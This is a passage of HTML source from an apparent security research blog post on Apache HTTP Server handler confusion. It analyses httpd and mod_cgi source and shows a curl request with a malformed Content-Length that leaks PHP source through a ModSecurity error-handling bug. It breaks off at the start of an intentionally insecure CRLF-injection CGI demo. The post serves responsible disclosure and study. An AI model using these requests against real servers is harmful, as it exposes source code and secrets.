&lt;h4 id=&quot;️-primitive-3-1-overwrite-the-handler&quot;&gt;⚔️ Primitive 3-1. Overwrite the Handler&lt;/h4&gt;

&lt;p&gt;By understanding this conversion mechanism, the first primitive is — &lt;strong&gt;Overwrite the Handler&lt;/strong&gt;. Imagine if today the target Apache HTTP Server uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; to run PHP.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt; application/x-httpd-php  .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the normal process, when accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/config.php&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_mime&lt;/code&gt;, during the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type_checker&lt;/code&gt; phase, Httpd copies the corresponding content into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; based on the file extension set by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt;. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; is not assigned during the entire HTTP lifecycle, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; will treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; as the handler, ultimately calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; to handle the request.&lt;/p&gt;

&lt;p&gt;However, what happens if any module “accidentally” overwrites &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; before reaching &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt;?&lt;/p&gt;

&lt;h5 id=&quot;️-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;The first exploitation of this primitive is to disclose arbitrary PHP source code by the “accidentally-overwrite”. This technique was first mentioned by Max Dmitriev in his research presented at ZeroNights 2021 (kudos to him!), and you can check his slides here:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf&quot;&gt;Apache 0day bug, which still nobody knows of, and which was fixed accidentally&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Max Dmitriev observed that by sending an incorrect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Length&lt;/code&gt;, the remote Httpd server would trigger an unexpected error and inadvertently return the source code of PHP script. Upon investigating the process, he discovered that the issue was due to ModSecurity not properly handling the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; while using the Apache Portable Runtime (APR) library, leading to a &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt;. When an error occurred, Httpd attempts to send out HTML error messages, thus accidentally overwriting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text/html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because ModSecurity did not properly handle the return values, the internal HTTP lifecycle that should have stopped continued. This “side effect” also overwrote the originally added &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;, resulting in files that should have been processed as PHP being treated as plain documents, exposing its source code and sensitive settings. 🤫&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://127.0.0.1/info.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Length: x&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; HTTP/1.1 400 Bad Request
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Date: Mon, 29 Jul 2024 05:32:23 GMT
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
...
&amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In theory, all configurations based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; are vulnerable to this type of attack, so apart from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; paired with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_actions&lt;/code&gt; shown in  Max’s slides, pure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; coupled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; is also affected.&lt;/p&gt;

&lt;p&gt;It’s worth mentioning that this side effect was corrected as a &lt;a href=&quot;https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a&quot;&gt;request parser bug&lt;/a&gt; in Apache HTTP Server version 2.4.44, thus treating this “vulnerability” as fixed until I picked it up again. However, since the root cause is still ModSecurity not handling errors properly, the same behavior can still be successfully reproduced if another code path that triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; is found.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. This issue was reported to ModSecurity through the official security mail on 6/20, and the Project Co-Leader suggested returning to the original &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;GitHub Issue&lt;/a&gt; for discussion.&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-3-1-2-overwrite-handler-to---&quot;&gt;✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████&lt;/h5&gt;

&lt;p&gt;Based on the &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt; behavior and its side effects mentioned earlier, this primitive could lead to other more cool exploitations. However, as this issue has not been fully fixed, further exploitation will be disclosed after the issue is fully resolved.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;⚔️ Primitive 3-2. Invoke Arbitrary Handlers&lt;/h4&gt;

&lt;p&gt;Let’s think more carefully about the previous Overwrite Handler primitive, although it’s caused by ModSecurity not properly handling errors, leading to the request being set with the wrong &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;, the deeper fundamental root cause should be — &lt;strong&gt;when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;, Apache HTTP Server actually cannot distinguish its semantics; this field can be set by directive during the request phase or used as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header in the server response&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Theoretically, if you can control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header in the server response, you could invoke arbitrary module handlers through this legacy code snippet. This is the last primitive of Handler Confusion — &lt;strong&gt;invoking any internal module handler&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;However, there’s still one last piece of the puzzle. In Httpd, all modifications to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; from the server response occur after that legacy code. So, even if you can control the value of that field, at that point in the HTTP lifecycle, it’s too late to do further exploitation… is that right?&lt;/p&gt;

&lt;p&gt;We turned to &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875&quot;&gt;RFC 3875&lt;/a&gt; for a rescue! RFC 3875 is a specification about CGI, and &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2&quot;&gt;Section 6.2.2&lt;/a&gt; defines a Local Redirect Response behavior:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Simply put, the specification mandates that under certain conditions, CGI must use Server-Side resources to handle redirects. A close examination of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; implementation of this specification reveals:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983&quot;&gt;modules/generators/mod_cgi.c#L983&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_scan_script_header_err_brigade_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;
                                                    &lt;span class=&quot;n&quot;&gt;APLOG_MODULE_INDEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP_NOT_MODIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* This redirect needs to be a GET no matter what the original
         * method was.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method_number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* We already read the message body (if any), so don&apos;t allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apr_table_unset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Initially, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; executes&lt;sup&gt;[1]&lt;/sup&gt; CGI and scans its output to set the corresponding headers such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;. If&lt;sup&gt;[2]&lt;/sup&gt; the returned &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; is 200 and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; header starts with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, the response is treated as a Server-Side Redirection and should be processed&lt;sup&gt;[3]&lt;/sup&gt; internally. A closer look at the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_internal_redirect_handler()&lt;/code&gt; shows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800&quot;&gt;modules/http/http_request.c#L800&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;internal_internal_redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ap_die was already called, if an error occured */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ap_set_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_process_request_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [4]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Httpd first creates&lt;sup&gt;[1]&lt;/sup&gt; a new request structure and copie&lt;sup&gt;[2]&lt;/sup&gt; the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; into it. After processing&lt;sub&gt;[3]&lt;/sub&gt; the lifecycle, it calls&lt;sup&gt;[4]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; — the place including the legacy transformation. So, &lt;strong&gt;in Server-Side Redirects, if you can control the response headers, you can invoke any module handler within Httpd&lt;/strong&gt;. Basically, all CGI implementations in Apache HTTP Server follow this behavior, and here’s a simple list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mod_cgi&lt;/li&gt;
  &lt;li&gt;mod_cgid&lt;/li&gt;
  &lt;li&gt;mod_wsgi&lt;/li&gt;
  &lt;li&gt;mod_uwsgi&lt;/li&gt;
  &lt;li&gt;mod_fastcgi&lt;/li&gt;
  &lt;li&gt;mod_perl&lt;/li&gt;
  &lt;li&gt;mod_asis&lt;/li&gt;
  &lt;li&gt;mod_fcgid&lt;/li&gt;
  &lt;li&gt;mod_proxy_scgi&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As for how to trigger this server-side redirect in real-world scenarios? Since you need at least control over the response’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; and part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;, here are two scenarios for reference:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;CRLF Injection in the CGI response headers, allowing overwriting of existing HTTP headers by new lines.&lt;/li&gt;
  &lt;li&gt;SSRF that can completely control the response headers, such as a project hosted on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_wsgi&lt;/code&gt; like &lt;a href=&quot;https://django-revproxy.readthedocs.io/en/latest/&quot;&gt;django-revproxy&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The following examples are all based on this insecure CRLF Injection for the purpose of demonstration:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl &lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
